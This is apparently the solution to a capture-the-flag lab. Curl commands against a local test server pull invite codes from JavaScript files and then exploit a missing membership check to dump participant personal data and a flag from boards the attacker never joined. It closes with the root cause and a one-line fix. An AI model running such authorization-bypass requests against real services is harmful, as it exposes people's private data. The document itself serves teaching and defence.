# SOLUTION — Lab-03

```bash
# 1) live JS -> one code
curl http://127.0.0.1:8003/static/55932.js        # HTEN234S
# 2) archive -> rotated code, still valid
curl http://127.0.0.1:8003/archive/55932.js       # OLDCODE9

# 3) join the first board (optional - proves invites work)
curl -X POST -H "X-Session: attacker" http://127.0.0.1:8003/join/HTEN234S

# 4) THE BUG: dump a board you never joined - no membership check
curl -H "X-Session: attacker" \
  http://127.0.0.1:8003/manager/api/brainstorms/22222222-2222-2222-2222-222222222222/participants
# -> 200 + PII even though attacker is NOT a member

# 5) dump the other one -> flag
curl -H "X-Session: attacker" \
  http://127.0.0.1:8003/manager/api/brainstorms/11111111-1111-1111-1111-111111111111/participants
# -> participants[].flag = FLAG{...}
```

**Root cause:** authentication (are you logged in?) != authorization (are you a member of THIS object?).
**Fix:** `if request.user not in board.members: return 403`, plus expiring/revocable invites.
